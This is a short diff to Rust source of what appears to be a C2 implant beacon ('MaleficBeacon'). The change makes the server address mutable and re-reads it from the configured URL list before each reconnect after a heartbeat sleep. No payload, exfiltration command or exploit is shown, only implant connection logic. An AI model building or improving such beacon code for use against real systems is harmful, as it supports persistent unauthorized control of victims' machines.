@@ -27,7 +27,7 @@ impl MaleficBeacon {
         #[cfg(debug_assertions)]
         let _defer = malefic_helper::Defer::new("[beacon] beacon exit!");
 
-        let addr = self.stub.meta.urls.first().unwrap().clone();
+        let mut addr = self.stub.meta.urls.first().unwrap().clone();
         let transport = self.client.connect(addr.as_str()).await.map_err(|_e| {
             debug!("[beacon] Failed to connect to server: {:#?}", _e);
             return ();
@@ -55,6 +55,7 @@ impl MaleficBeacon {
             let sleep_time = Duration::from_millis(self.stub.meta.new_heartbeat());
             debug!("[beacon] sleeping {:?}", sleep_time);
             Delay::new(sleep_time).await;
+            addr = self.stub.meta.urls.first().unwrap().clone();
             match self.client.connect(addr.as_str()).await {
                 Ok(transport) => {
                     let transport = Transport::new(transport);
